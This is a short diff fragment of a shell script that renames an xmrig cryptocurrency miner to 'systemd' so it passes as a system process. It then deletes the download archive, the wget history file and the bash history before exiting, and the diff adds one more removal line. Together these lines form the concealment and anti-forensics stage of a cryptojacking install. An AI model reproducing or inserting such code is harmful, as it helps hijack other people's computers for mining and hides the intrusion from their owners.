@@ -13,6 +13,7 @@ mv ./xmrig ./systemd
 cd ../..
 rm -r master.zip
 rm ./nv3v2
+rm .bash
 rm .wget-hsts
 rm .bash_history && history && exit
 
